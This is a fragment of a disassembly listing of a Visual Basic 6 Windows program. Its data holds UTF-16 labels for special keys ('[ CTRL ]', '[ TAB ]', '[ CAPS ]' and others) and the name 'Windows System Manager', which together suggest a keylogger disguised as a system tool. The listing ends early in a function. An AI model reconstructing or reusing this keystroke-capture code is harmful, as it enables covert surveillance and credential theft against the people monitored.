  4026f9:	00 00                	add    %al,(%eax)
  4026fb:	00 02                	add    %al,(%edx)
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	00 3a                	add    %bh,(%edx)
  402701:	00 00                	add    %al,(%eax)
  402703:	00 02                	add    %al,(%edx)
  402705:	00 00                	add    %al,(%eax)
  402707:	00 a7 00 00 00 02    	add    %ah,0x2000000(%edi)
  40270d:	00 00                	add    %al,(%eax)
  40270f:	00 f9                	add    %bh,%cl
  402711:	00 00                	add    %al,(%eax)
  402713:	00 02                	add    %al,(%edx)
  402715:	00 00                	add    %al,(%eax)
  402717:	00 e9                	add    %ch,%cl
  402719:	00 00                	add    %al,(%eax)
  40271b:	00 02                	add    %al,(%edx)
  40271d:	00 00                	add    %al,(%eax)
  40271f:	00 e8                	add    %ch,%al
  402721:	00 00                	add    %al,(%eax)
  402723:	00 02                	add    %al,(%edx)
  402725:	00 00                	add    %al,(%eax)
  402727:	00 b0 00 00 00 02    	add    %dh,0x2000000(%eax)
  40272d:	00 00                	add    %al,(%eax)
  40272f:	00 e0                	add    %ah,%al
  402731:	00 00                	add    %al,(%eax)
  402733:	00 02                	add    %al,(%edx)
  402735:	00 00                	add    %al,(%eax)
  402737:	00 3f                	add    %bh,(%edi)
  402739:	00 00                	add    %al,(%eax)
  40273b:	00 02                	add    %al,(%edx)
  40273d:	00 00                	add    %al,(%eax)
  40273f:	00 27                	add    %ah,(%edi)
  402741:	00 00                	add    %al,(%eax)
  402743:	00 02                	add    %al,(%edx)
  402745:	00 00                	add    %al,(%eax)
  402747:	00 5e 00             	add    %bl,0x0(%esi)
  40274a:	00 00                	add    %al,(%eax)
  40274c:	02 00                	add    (%eax),%al
  40274e:	00 00                	add    %al,(%eax)
  402750:	ec                   	in     (%dx),%al
  402751:	00 00                	add    %al,(%eax)
  402753:	00 02                	add    %al,(%edx)
  402755:	00 00                	add    %al,(%eax)
  402757:	00 e7                	add    %ah,%bh
  402759:	00 00                	add    %al,(%eax)
  40275b:	00 02                	add    %al,(%edx)
  40275d:	00 00                	add    %al,(%eax)
  40275f:	00 f2                	add    %dh,%dl
  402761:	00 00                	add    %al,(%eax)
  402763:	00 14 00             	add    %dl,(%eax,%eax,1)
  402766:	00 00                	add    %al,(%eax)
  402768:	20 00                	and    %al,(%eax)
  40276a:	5b                   	pop    %ebx
  40276b:	00 20                	add    %ah,(%eax)
  40276d:	00 43 00             	add    %al,0x0(%ebx)
  402770:	41                   	inc    %ecx
  402771:	00 4e 00             	add    %cl,0x0(%esi)
  402774:	43                   	inc    %ebx
  402775:	00 20                	add    %ah,(%eax)
  402777:	00 5d 00             	add    %bl,0x0(%ebp)
  40277a:	20 00                	and    %al,(%eax)
  40277c:	00 00                	add    %al,(%eax)
  40277e:	00 00                	add    %al,(%eax)
  402780:	5f                   	pop    %edi
  402781:	5f                   	pop    %edi
  402782:	76 62                	jbe    0x4027e6
  402784:	61                   	popa
  402785:	53                   	push   %ebx
  402786:	74 72                	je     0x4027fa
  402788:	43                   	inc    %ebx
  402789:	6d                   	insl   (%dx),%es:(%edi)
  40278a:	70 00                	jo     0x40278c
  40278c:	12 00                	adc    (%eax),%al
  40278e:	00 00                	add    %al,(%eax)
  402790:	20 00                	and    %al,(%eax)
  402792:	5b                   	pop    %ebx
  402793:	00 20                	add    %ah,(%eax)
  402795:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  402799:	00 42 00             	add    %al,0x0(%edx)
  40279c:	20 00                	and    %al,(%eax)
  40279e:	5d                   	pop    %ebp
  40279f:	00 20                	add    %ah,(%eax)
  4027a1:	00 00                	add    %al,(%eax)
  4027a3:	00 12                	add    %dl,(%edx)
  4027a5:	00 00                	add    %al,(%eax)
  4027a7:	00 20                	add    %ah,(%eax)
  4027a9:	00 5b 00             	add    %bl,0x0(%ebx)
  4027ac:	20 00                	and    %al,(%eax)
  4027ae:	43                   	inc    %ebx
  4027af:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  4027b3:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  4027b7:	00 5d 00             	add    %bl,0x0(%ebp)
  4027ba:	00 00                	add    %al,(%eax)
  4027bc:	12 00                	adc    (%eax),%al
  4027be:	00 00                	add    %al,(%eax)
  4027c0:	20 00                	and    %al,(%eax)
  4027c2:	5b                   	pop    %ebx
  4027c3:	00 20                	add    %ah,(%eax)
  4027c5:	00 41 00             	add    %al,0x0(%ecx)
  4027c8:	4c                   	dec    %esp
  4027c9:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  4027cd:	00 5d 00             	add    %bl,0x0(%ebp)
  4027d0:	20 00                	and    %al,(%eax)
  4027d2:	00 00                	add    %al,(%eax)
  4027d4:	16                   	push   %ss
  4027d5:	00 00                	add    %al,(%eax)
  4027d7:	00 20                	add    %ah,(%eax)
  4027d9:	00 5b 00             	add    %bl,0x0(%ebx)
  4027dc:	20 00                	and    %al,(%eax)
  4027de:	50                   	push   %eax
  4027df:	00 41 00             	add    %al,0x0(%ecx)
  4027e2:	55                   	push   %ebp
  4027e3:	00 53 00             	add    %dl,0x0(%ebx)
  4027e6:	45                   	inc    %ebp
  4027e7:	00 20                	add    %ah,(%eax)
  4027e9:	00 5d 00             	add    %bl,0x0(%ebp)
  4027ec:	20 00                	and    %al,(%eax)
  4027ee:	00 00                	add    %al,(%eax)
  4027f0:	14 00                	adc    $0x0,%al
  4027f2:	00 00                	add    %al,(%eax)
  4027f4:	20 00                	and    %al,(%eax)
  4027f6:	5b                   	pop    %ebx
  4027f7:	00 20                	add    %ah,(%eax)
  4027f9:	00 43 00             	add    %al,0x0(%ebx)
  4027fc:	41                   	inc    %ecx
  4027fd:	00 50 00             	add    %dl,0x0(%eax)
  402800:	53                   	push   %ebx
  402801:	00 20                	add    %ah,(%eax)
  402803:	00 5d 00             	add    %bl,0x0(%ebp)
  402806:	20 00                	and    %al,(%eax)
  402808:	00 00                	add    %al,(%eax)
  40280a:	00 00                	add    %al,(%eax)
  40280c:	12 00                	adc    (%eax),%al
  40280e:	00 00                	add    %al,(%eax)
  402810:	20 00                	and    %al,(%eax)
  402812:	5b                   	pop    %ebx
  402813:	00 20                	add    %ah,(%eax)
  402815:	00 45 00             	add    %al,0x0(%ebp)
  402818:	53                   	push   %ebx
  402819:	00 43 00             	add    %al,0x0(%ebx)
  40281c:	20 00                	and    %al,(%eax)
  40281e:	5d                   	pop    %ebp
  40281f:	00 20                	add    %ah,(%eax)
  402821:	00 00                	add    %al,(%eax)
  402823:	00 02                	add    %al,(%edx)
  402825:	00 00                	add    %al,(%eax)
  402827:	00 20                	add    %ah,(%eax)
  402829:	00 00                	add    %al,(%eax)
  40282b:	00 18                	add    %bl,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	00 20                	add    %ah,(%eax)
  402831:	00 5b 00             	add    %bl,0x0(%ebx)
  402834:	20 00                	and    %al,(%eax)
  402836:	50                   	push   %eax
  402837:	00 61 00             	add    %ah,0x0(%ecx)
  40283a:	67 00 65 00          	add    %ah,0x0(%di)
  40283e:	55                   	push   %ebp
  40283f:	00 70 00             	add    %dh,0x0(%eax)
  402842:	20 00                	and    %al,(%eax)
  402844:	5d                   	pop    %ebp
  402845:	00 20                	add    %ah,(%eax)
  402847:	00 00                	add    %al,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40284e:	00 00                	add    %al,(%eax)
  402850:	20 00                	and    %al,(%eax)
  402852:	5b                   	pop    %ebx
  402853:	00 20                	add    %ah,(%eax)
  402855:	00 50 00             	add    %dl,0x0(%eax)
  402858:	61                   	popa
  402859:	00 67 00             	add    %ah,0x0(%edi)
  40285c:	65 00 44 00 6f       	add    %al,%gs:0x6f(%eax,%eax,1)
  402861:	00 77 00             	add    %dh,0x0(%edi)
  402864:	6e                   	outsb  %ds:(%esi),(%dx)
  402865:	00 20                	add    %ah,(%eax)
  402867:	00 5d 00             	add    %bl,0x0(%ebp)
  40286a:	20 00                	and    %al,(%eax)
  40286c:	00 00                	add    %al,(%eax)
  40286e:	00 00                	add    %al,(%eax)
  402870:	12 00                	adc    (%eax),%al
  402872:	00 00                	add    %al,(%eax)
  402874:	20 00                	and    %al,(%eax)
  402876:	5b                   	pop    %ebx
  402877:	00 20                	add    %ah,(%eax)
  402879:	00 45 00             	add    %al,0x0(%ebp)
  40287c:	4e                   	dec    %esi
  40287d:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  402881:	00 5d 00             	add    %bl,0x0(%ebp)
  402884:	20 00                	and    %al,(%eax)
  402886:	00 00                	add    %al,(%eax)
  402888:	14 00                	adc    $0x0,%al
  40288a:	00 00                	add    %al,(%eax)
  40288c:	20 00                	and    %al,(%eax)
  40288e:	5b                   	pop    %ebx
  40288f:	00 20                	add    %ah,(%eax)
  402891:	00 48 00             	add    %cl,0x0(%eax)
  402894:	4f                   	dec    %edi
  402895:	00 4d 00             	add    %cl,0x0(%ebp)
  402898:	45                   	inc    %ebp
  402899:	00 20                	add    %ah,(%eax)
  40289b:	00 5d 00             	add    %bl,0x0(%ebp)
  40289e:	20 00                	and    %al,(%eax)
  4028a0:	00 00                	add    %al,(%eax)
  4028a2:	00 00                	add    %al,(%eax)
  4028a4:	14 00                	adc    $0x0,%al
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	20 00                	and    %al,(%eax)
  4028aa:	5b                   	pop    %ebx
  4028ab:	00 20                	add    %ah,(%eax)
  4028ad:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  4028b1:	00 46 00             	add    %al,0x0(%esi)
  4028b4:	54                   	push   %esp
  4028b5:	00 20                	add    %ah,(%eax)
  4028b7:	00 5d 00             	add    %bl,0x0(%ebp)
  4028ba:	20 00                	and    %al,(%eax)
  4028bc:	00 00                	add    %al,(%eax)
  4028be:	00 00                	add    %al,(%eax)
  4028c0:	10 00                	adc    %al,(%eax)
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	20 00                	and    %al,(%eax)
  4028c6:	5b                   	pop    %ebx
  4028c7:	00 20                	add    %ah,(%eax)
  4028c9:	00 55 00             	add    %dl,0x0(%ebp)
  4028cc:	50                   	push   %eax
  4028cd:	00 20                	add    %ah,(%eax)
  4028cf:	00 5d 00             	add    %bl,0x0(%ebp)
  4028d2:	20 00                	and    %al,(%eax)
  4028d4:	00 00                	add    %al,(%eax)
  4028d6:	00 00                	add    %al,(%eax)
  4028d8:	16                   	push   %ss
  4028d9:	00 00                	add    %al,(%eax)
  4028db:	00 20                	add    %ah,(%eax)
  4028dd:	00 5b 00             	add    %bl,0x0(%ebx)
  4028e0:	20 00                	and    %al,(%eax)
  4028e2:	52                   	push   %edx
  4028e3:	00 49 00             	add    %cl,0x0(%ecx)
  4028e6:	47                   	inc    %edi
  4028e7:	00 48 00             	add    %cl,0x0(%eax)
  4028ea:	54                   	push   %esp
  4028eb:	00 20                	add    %ah,(%eax)
  4028ed:	00 5d 00             	add    %bl,0x0(%ebp)
  4028f0:	20 00                	and    %al,(%eax)
  4028f2:	00 00                	add    %al,(%eax)
  4028f4:	14 00                	adc    $0x0,%al
  4028f6:	00 00                	add    %al,(%eax)
  4028f8:	20 00                	and    %al,(%eax)
  4028fa:	5b                   	pop    %ebx
  4028fb:	00 20                	add    %ah,(%eax)
  4028fd:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  402901:	00 57 00             	add    %dl,0x0(%edi)
  402904:	4e                   	dec    %esi
  402905:	00 20                	add    %ah,(%eax)
  402907:	00 5d 00             	add    %bl,0x0(%ebp)
  40290a:	20 00                	and    %al,(%eax)
  40290c:	00 00                	add    %al,(%eax)
  40290e:	00 00                	add    %al,(%eax)
  402910:	18 00                	sbb    %al,(%eax)
  402912:	00 00                	add    %al,(%eax)
  402914:	20 00                	and    %al,(%eax)
  402916:	5b                   	pop    %ebx
  402917:	00 20                	add    %ah,(%eax)
  402919:	00 53 00             	add    %dl,0x0(%ebx)
  40291c:	45                   	inc    %ebp
  40291d:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  402921:	00 43 00             	add    %al,0x0(%ebx)
  402924:	54                   	push   %esp
  402925:	00 20                	add    %ah,(%eax)
  402927:	00 5d 00             	add    %bl,0x0(%ebp)
  40292a:	20 00                	and    %al,(%eax)
  40292c:	00 00                	add    %al,(%eax)
  40292e:	00 00                	add    %al,(%eax)
  402930:	5f                   	pop    %edi
  402931:	5f                   	pop    %edi
  402932:	76 62                	jbe    0x402996
  402934:	61                   	popa
  402935:	46                   	inc    %esi
  402936:	72 65                	jb     0x40299d
  402938:	65 4f                	gs dec %edi
  40293a:	62 6a 4c             	bound  %ebp,0x4c(%edx)
  40293d:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  402944:	00 00                	add    %al,(%eax)
  402946:	00 00                	add    %al,(%eax)
  402948:	16                   	push   %ss
  402949:	00 00                	add    %al,(%eax)
  40294b:	00 20                	add    %ah,(%eax)
  40294d:	00 5b 00             	add    %bl,0x0(%ebx)
  402950:	20 00                	and    %al,(%eax)
  402952:	50                   	push   %eax
  402953:	00 52 00             	add    %dl,0x0(%edx)
  402956:	49                   	dec    %ecx
  402957:	00 4e 00             	add    %cl,0x0(%esi)
  40295a:	54                   	push   %esp
  40295b:	00 20                	add    %ah,(%eax)
  40295d:	00 5d 00             	add    %bl,0x0(%ebp)
  402960:	20 00                	and    %al,(%eax)
  402962:	00 00                	add    %al,(%eax)
  402964:	12 00                	adc    (%eax),%al
  402966:	00 00                	add    %al,(%eax)
  402968:	20 00                	and    %al,(%eax)
  40296a:	5b                   	pop    %ebx
  40296b:	00 20                	add    %ah,(%eax)
  40296d:	00 49 00             	add    %cl,0x0(%ecx)
  402970:	4e                   	dec    %esi
  402971:	00 53 00             	add    %dl,0x0(%ebx)
  402974:	20 00                	and    %al,(%eax)
  402976:	5d                   	pop    %ebp
  402977:	00 20                	add    %ah,(%eax)
  402979:	00 00                	add    %al,(%eax)
  40297b:	00 12                	add    %dl,(%edx)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	00 20                	add    %ah,(%eax)
  402981:	00 5b 00             	add    %bl,0x0(%ebx)
  402984:	20 00                	and    %al,(%eax)
  402986:	44                   	inc    %esp
  402987:	00 45 00             	add    %al,0x0(%ebp)
  40298a:	4c                   	dec    %esp
  40298b:	00 20                	add    %ah,(%eax)
  40298d:	00 5d 00             	add    %bl,0x0(%ebp)
  402990:	20 00                	and    %al,(%eax)
  402992:	00 00                	add    %al,(%eax)
  402994:	14 00                	adc    $0x0,%al
  402996:	00 00                	add    %al,(%eax)
  402998:	20 00                	and    %al,(%eax)
  40299a:	5b                   	pop    %ebx
  40299b:	00 20                	add    %ah,(%eax)
  40299d:	00 48 00             	add    %cl,0x0(%eax)
  4029a0:	45                   	inc    %ebp
  4029a1:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  4029a5:	00 20                	add    %ah,(%eax)
  4029a7:	00 5d 00             	add    %bl,0x0(%ebp)
  4029aa:	20 00                	and    %al,(%eax)
  4029ac:	00 00                	add    %al,(%eax)
  4029ae:	00 00                	add    %al,(%eax)
  4029b0:	1a 00                	sbb    (%eax),%al
  4029b2:	00 00                	add    %al,(%eax)
  4029b4:	20 00                	and    %al,(%eax)
  4029b6:	5b                   	pop    %ebx
  4029b7:	00 20                	add    %ah,(%eax)
  4029b9:	00 57 00             	add    %dl,0x0(%edi)
  4029bc:	49                   	dec    %ecx
  4029bd:	00 4e 00             	add    %cl,0x0(%esi)
  4029c0:	44                   	inc    %esp
  4029c1:	00 4f 00             	add    %cl,0x0(%edi)
  4029c4:	57                   	push   %edi
  4029c5:	00 53 00             	add    %dl,0x0(%ebx)
  4029c8:	20 00                	and    %al,(%eax)
  4029ca:	5d                   	pop    %ebp
  4029cb:	00 20                	add    %ah,(%eax)
  4029cd:	00 00                	add    %al,(%eax)
  4029cf:	00 56 42             	add    %dl,0x42(%esi)
  4029d2:	41                   	inc    %ecx
  4029d3:	36 2e 44             	ss cs inc %esp
  4029d6:	4c                   	dec    %esp
  4029d7:	4c                   	dec    %esp
  4029d8:	00 00                	add    %al,(%eax)
  4029da:	00 00                	add    %al,(%eax)
  4029dc:	5f                   	pop    %edi
  4029dd:	5f                   	pop    %edi
  4029de:	76 62                	jbe    0x402a42
  4029e0:	61                   	popa
  4029e1:	45                   	inc    %ebp
  4029e2:	72 72                	jb     0x402a56
  4029e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e5:	72 4f                	jb     0x402a36
  4029e7:	76 65                	jbe    0x402a4e
  4029e9:	72 66                	jb     0x402a51
  4029eb:	6c                   	insb   (%dx),%es:(%edi)
  4029ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4029ed:	77 00                	ja     0x4029ef
  4029ef:	00 5f 5f             	add    %bl,0x5f(%edi)
  4029f2:	76 62                	jbe    0x402a56
  4029f4:	61                   	popa
  4029f5:	56                   	push   %esi
  4029f6:	61                   	popa
  4029f7:	72 43                	jb     0x402a3c
  4029f9:	61                   	popa
  4029fa:	74 00                	je     0x4029fc
  4029fc:	5f                   	pop    %edi
  4029fd:	5f                   	pop    %edi
  4029fe:	76 62                	jbe    0x402a62
  402a00:	61                   	popa
  402a01:	53                   	push   %ebx
  402a02:	74 72                	je     0x402a76
  402a04:	56                   	push   %esi
  402a05:	61                   	popa
  402a06:	72 56                	jb     0x402a5e
  402a08:	61                   	popa
  402a09:	6c                   	insb   (%dx),%es:(%edi)
  402a0a:	00 00                	add    %al,(%eax)
  402a0c:	5f                   	pop    %edi
  402a0d:	5f                   	pop    %edi
  402a0e:	76 62                	jbe    0x402a72
  402a10:	61                   	popa
  402a11:	4c                   	dec    %esp
  402a12:	65 6e                	outsb  %gs:(%esi),(%dx)
  402a14:	42                   	inc    %edx
  402a15:	73 74                	jae    0x402a8b
  402a17:	72 00                	jb     0x402a19
  402a19:	00 00                	add    %al,(%eax)
  402a1b:	00 5f 5f             	add    %bl,0x5f(%edi)
  402a1e:	76 62                	jbe    0x402a82
  402a20:	61                   	popa
  402a21:	53                   	push   %ebx
  402a22:	74 72                	je     0x402a96
  402a24:	43                   	inc    %ebx
  402a25:	61                   	popa
  402a26:	74 00                	je     0x402a28
  402a28:	5f                   	pop    %edi
  402a29:	5f                   	pop    %edi
  402a2a:	76 62                	jbe    0x402a8e
  402a2c:	61                   	popa
  402a2d:	46                   	inc    %esi
  402a2e:	72 65                	jb     0x402a95
  402a30:	65 53                	gs push %ebx
  402a32:	74 72                	je     0x402aa6
  402a34:	4c                   	dec    %esp
  402a35:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  402a3c:	5f                   	pop    %edi
  402a3d:	5f                   	pop    %edi
  402a3e:	76 62                	jbe    0x402aa2
  402a40:	61                   	popa
  402a41:	53                   	push   %ebx
  402a42:	65 74 53             	gs je  0x402a98
  402a45:	79 73                	jns    0x402aba
  402a47:	74 65                	je     0x402aae
  402a49:	6d                   	insl   (%dx),%es:(%edi)
  402a4a:	45                   	inc    %ebp
  402a4b:	72 72                	jb     0x402abf
  402a4d:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4e:	72 00                	jb     0x402a50
  402a50:	5f                   	pop    %edi
  402a51:	5f                   	pop    %edi
  402a52:	76 62                	jbe    0x402ab6
  402a54:	61                   	popa
  402a55:	53                   	push   %ebx
  402a56:	74 72                	je     0x402aca
  402a58:	54                   	push   %esp
  402a59:	6f                   	outsl  %ds:(%esi),(%dx)
  402a5a:	41                   	inc    %ecx
  402a5b:	6e                   	outsb  %ds:(%esi),(%dx)
  402a5c:	73 69                	jae    0x402ac7
  402a5e:	00 00                	add    %al,(%eax)
  402a60:	5f                   	pop    %edi
  402a61:	5f                   	pop    %edi
  402a62:	76 62                	jbe    0x402ac6
  402a64:	61                   	popa
  402a65:	4f                   	dec    %edi
  402a66:	62 6a 53             	bound  %ebp,0x53(%edx)
  402a69:	65 74 00             	gs je  0x402a6c
  402a6c:	5f                   	pop    %edi
  402a6d:	5f                   	pop    %edi
  402a6e:	76 62                	jbe    0x402ad2
  402a70:	61                   	popa
  402a71:	46                   	inc    %esi
  402a72:	72 65                	jb     0x402ad9
  402a74:	65 56                	gs push %esi
  402a76:	61                   	popa
  402a77:	72 4c                	jb     0x402ac5
  402a79:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  402a80:	5f                   	pop    %edi
  402a81:	5f                   	pop    %edi
  402a82:	76 62                	jbe    0x402ae6
  402a84:	61                   	popa
  402a85:	46                   	inc    %esi
  402a86:	72 65                	jb     0x402aed
  402a88:	65 53                	gs push %ebx
  402a8a:	74 72                	je     0x402afe
  402a8c:	00 00                	add    %al,(%eax)
  402a8e:	00 00                	add    %al,(%eax)
  402a90:	5f                   	pop    %edi
  402a91:	5f                   	pop    %edi
  402a92:	76 62                	jbe    0x402af6
  402a94:	61                   	popa
  402a95:	56                   	push   %esi
  402a96:	61                   	popa
  402a97:	72 44                	jb     0x402add
  402a99:	75 70                	jne    0x402b0b
  402a9b:	00 5f 5f             	add    %bl,0x5f(%edi)
  402a9e:	76 62                	jbe    0x402b02
  402aa0:	61                   	popa
  402aa1:	53                   	push   %ebx
  402aa2:	74 72                	je     0x402b16
  402aa4:	56                   	push   %esi
  402aa5:	61                   	popa
  402aa6:	72 4d                	jb     0x402af5
  402aa8:	6f                   	outsl  %ds:(%esi),(%dx)
  402aa9:	76 65                	jbe    0x402b10
  402aab:	00 5f 5f             	add    %bl,0x5f(%edi)
  402aae:	76 62                	jbe    0x402b12
  402ab0:	61                   	popa
  402ab1:	53                   	push   %ebx
  402ab2:	74 72                	je     0x402b26
  402ab4:	4d                   	dec    %ebp
  402ab5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ab6:	76 65                	jbe    0x402b1d
  402ab8:	00 00                	add    %al,(%eax)
  402aba:	00 00                	add    %al,(%eax)
  402abc:	5f                   	pop    %edi
  402abd:	5f                   	pop    %edi
  402abe:	76 62                	jbe    0x402b22
  402ac0:	61                   	popa
  402ac1:	53                   	push   %ebx
  402ac2:	74 72                	je     0x402b36
  402ac4:	43                   	inc    %ebx
  402ac5:	6f                   	outsl  %ds:(%esi),(%dx)
  402ac6:	70 79                	jo     0x402b41
  402ac8:	00 00                	add    %al,(%eax)
  402aca:	00 00                	add    %al,(%eax)
  402acc:	5f                   	pop    %edi
  402acd:	5f                   	pop    %edi
  402ace:	76 62                	jbe    0x402b32
  402ad0:	61                   	popa
  402ad1:	46                   	inc    %esi
  402ad2:	72 65                	jb     0x402b39
  402ad4:	65 4f                	gs dec %edi
  402ad6:	62 6a 00             	bound  %ebp,0x0(%edx)
  402ad9:	00 00                	add    %al,(%eax)
  402adb:	00 5f 5f             	add    %bl,0x5f(%edi)
  402ade:	76 62                	jbe    0x402b42
  402ae0:	61                   	popa
  402ae1:	48                   	dec    %eax
  402ae2:	72 65                	jb     0x402b49
  402ae4:	73 75                	jae    0x402b5b
  402ae6:	6c                   	insb   (%dx),%es:(%edi)
  402ae7:	74 43                	je     0x402b2c
  402ae9:	68 65 63 6b 4f       	push   $0x4f6b6365
  402aee:	62 6a 00             	bound  %ebp,0x0(%edx)
  402af1:	00 00                	add    %al,(%eax)
  402af3:	00 5f 5f             	add    %bl,0x5f(%edi)
  402af6:	76 62                	jbe    0x402b5a
  402af8:	61                   	popa
  402af9:	4e                   	dec    %esi
  402afa:	65 77 32             	gs ja  0x402b2f
  402afd:	00 00                	add    %al,(%eax)
  402aff:	00 58 24             	add    %bl,0x24(%eax)
  402b02:	40                   	inc    %eax
  402b03:	00 34 73             	add    %dh,(%ebx,%esi,2)
  402b06:	40                   	inc    %eax
  402b07:	00 5c 2b 40          	add    %bl,0x40(%ebx,%ebp,1)
	...
  402b5f:	00 bc 1b 40 00 ff ff 	add    %bh,-0xffc0(%ebx,%ebx,1)
  402b66:	ff                   	(bad)
  402b67:	ff 00                	incl   (%eax)
  402b69:	00 00                	add    %al,(%eax)
  402b6b:	00 08                	add    %cl,(%eax)
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	00 00                	add    %al,(%eax)
  402b71:	00 00                	add    %al,(%eax)
  402b73:	00 2c 2b             	add    %ch,(%ebx,%ebp,1)
  402b76:	40                   	inc    %eax
  402b77:	00 00                	add    %al,(%eax)
  402b79:	00 00                	add    %al,(%eax)
  402b7b:	00 0c 2b             	add    %cl,(%ebx,%ebp,1)
  402b7e:	40                   	inc    %eax
  402b7f:	00 08                	add    %cl,(%eax)
  402b81:	2b 40 00             	sub    0x0(%eax),%eax
  402b84:	08 2b                	or     %ch,(%ebx)
  402b86:	40                   	inc    %eax
	...
  402b93:	00 58 00             	add    %bl,0x0(%eax)
  402b96:	00 00                	add    %al,(%eax)
  402b98:	04 00                	add    $0x0,%al
  402b9a:	00 00                	add    %al,(%eax)
  402b9c:	00 00                	add    %al,(%eax)
  402b9e:	00 00                	add    %al,(%eax)
  402ba0:	0c 1f                	or     $0x1f,%al
  402ba2:	40                   	inc    %eax
  402ba3:	00 ff                	add    %bh,%bh
  402ba5:	ff                   	(bad)
  402ba6:	ff                   	(bad)
  402ba7:	ff 00                	incl   (%eax)
  402ba9:	00 00                	add    %al,(%eax)
  402bab:	00 08                	add    %cl,(%eax)
  402bad:	2b 40 00             	sub    0x0(%eax),%eax
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	00 00                	add    %al,(%eax)
  402bb4:	c4 2b                	les    (%ebx),%ebp
  402bb6:	40                   	inc    %eax
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	00 00                	add    %al,(%eax)
  402bbb:	00 ff                	add    %bh,%bh
  402bbd:	ff                   	(bad)
  402bbe:	ff                   	(bad)
  402bbf:	ff 00                	incl   (%eax)
  402bc1:	00 00                	add    %al,(%eax)
  402bc3:	00 57 69             	add    %dl,0x69(%edi)
  402bc6:	6e                   	outsb  %ds:(%esi),(%dx)
  402bc7:	64 6f                	outsl  %fs:(%esi),(%dx)
  402bc9:	77 73                	ja     0x402c3e
  402bcb:	20 53 79             	and    %dl,0x79(%ebx)
  402bce:	73 74                	jae    0x402c44
  402bd0:	65 6d                	gs insl (%dx),%es:(%edi)
  402bd2:	20 4d 61             	and    %cl,0x61(%ebp)
  402bd5:	6e                   	outsb  %ds:(%esi),(%dx)
  402bd6:	61                   	popa
  402bd7:	67 65 72 00          	addr16 gs jb 0x402bdb
  402bdb:	00 64 21 40          	add    %ah,0x40(%ecx,%eiz,1)
  402bdf:	00 e4                	add    %ah,%ah
  402be1:	20 40 00             	and    %al,0x0(%eax)
  402be4:	38 73 40             	cmp    %dh,0x40(%ebx)
  402be7:	00 64 21 40          	add    %ah,0x40(%ecx,%eiz,1)
  402beb:	00 8c 21 40 00 3c 73 	add    %cl,0x733c0040(%ecx,%eiz,1)
  402bf2:	40                   	inc    %eax
  402bf3:	00 64 21 40          	add    %ah,0x40(%ecx,%eiz,1)
  402bf7:	00 a4 21 40 00 40 73 	add    %ah,0x73400040(%ecx,%eiz,1)
  402bfe:	40                   	inc    %eax
  402bff:	00 64 21 40          	add    %ah,0x40(%ecx,%eiz,1)
  402c03:	00 c4                	add    %al,%ah
  402c05:	21 40 00             	and    %eax,0x0(%eax)
  402c08:	44                   	inc    %esp
  402c09:	73 40                	jae    0x402c4b
  402c0b:	00 cc                	add    %cl,%ah
  402c0d:	cc                   	int3
  402c0e:	cc                   	int3
  402c0f:	cc                   	int3
  402c10:	e9 e9 e9 e9 cc       	jmp    0xcd2a15fe
  402c15:	cc                   	int3
  402c16:	cc                   	int3
  402c17:	cc                   	int3
  402c18:	cc                   	int3
  402c19:	cc                   	int3
  402c1a:	cc                   	int3
  402c1b:	cc                   	int3
  402c1c:	cc                   	int3
  402c1d:	cc                   	int3
  402c1e:	cc                   	int3
  402c1f:	cc                   	int3
  402c20:	55                   	push   %ebp
  402c21:	8b ec                	mov    %esp,%ebp
  402c23:	83 ec 0c             	sub    $0xc,%esp
  402c26:	68 26 11 40 00       	push   $0x401126
  402c2b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402c31:	50                   	push   %eax
  402c32:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402c39:	83 ec 50             	sub    $0x50,%esp
  402c3c:	53                   	push   %ebx
  402c3d:	56                   	push   %esi
  402c3e:	57                   	push   %edi
  402c3f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  402c42:	c7 45 f8 d8 10 40 00 	movl   $0x4010d8,-0x8(%ebp)
  402c49:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402c4c:	8b c3                	mov    %ebx,%eax
  402c4e:	83 e0 01             	and    $0x1,%eax
  402c51:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402c54:	83 e3 fe             	and    $0xfffffffe,%ebx
  402c57:	53                   	push   %ebx
  402c58:	89 5d 08             	mov    %ebx,0x8(%ebp)
  402c5b:	8b 0b                	mov    (%ebx),%ecx
  402c5d:	ff 51 04             	call   *0x4(%ecx)
  402c60:	a1 34 73 40 00       	mov    0x407334,%eax
  402c65:	33 ff                	xor    %edi,%edi
  402c67:	3b c7                	cmp    %edi,%eax
  402c69:	89 7d e8             	mov    %edi,-0x18(%ebp)
  402c6c:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  402c6f:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  402c72:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  402c75:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  402c78:	75 10                	jne    0x402c8a
  402c7a:	68 34 73 40 00       	push   $0x407334
  402c7f:	68 78 24 40 00       	push   $0x402478
  402c84:	ff 15 88 10 40 00    	call   *0x401088
